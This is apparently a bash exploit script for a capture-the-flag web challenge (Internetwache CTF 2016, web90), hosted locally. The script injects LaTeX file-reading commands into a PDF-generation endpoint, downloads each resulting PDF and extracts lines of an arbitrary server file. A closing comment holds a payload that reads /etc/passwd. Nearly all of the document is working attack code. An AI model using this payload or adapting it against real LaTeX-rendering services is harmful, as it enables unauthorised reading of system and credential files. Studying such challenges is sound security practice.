#!/bin/bash
# service apache2 start
# cd /var/www/html
# svn checkout https://github.com/internetwache/Internetwache-CTF-2016/trunk/tasks/web90/code
# move code/* .
# rm -rf code/
# mv config.php.sample config.php

declare -r URL="http://localhost/ajax.php"
declare -r HEADERS="Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
filename=$1

if [ $filename ]; then
  append_line="%0A\read\file%20to\line"
  for i in $(seq 1 100); do
    pdfresult=$(curl -s -X POST http://localhost/ajax.php -H "$HEADERS" -d "content=\newread\file%0A\openin\file=$filename$append_line%0A\text{\line}%0A\closein\file&template=blank" | grep -i Download | awk 'NF{print $NF}')

    if [ $pdfresult ]; then
      wget $pdfresult -O tmpfile &>/dev/null
      pdftotext tmpfile
      cat tmpfile.txt | head -n 1
      rm tmpfile tmpfile.txt
      append_line+="%0A\read\file%20to\line"
    else
      append_line+="%0A\read\file%20to\line"
    fi
  done
else
  echo -e "\n[!] Usage: $0 <PATH>\n"
fi


#\newread\file%0A\openin\file=/etc/passwd%0A\read\file%20to\line%0A\text{\line}%0A\closein\file
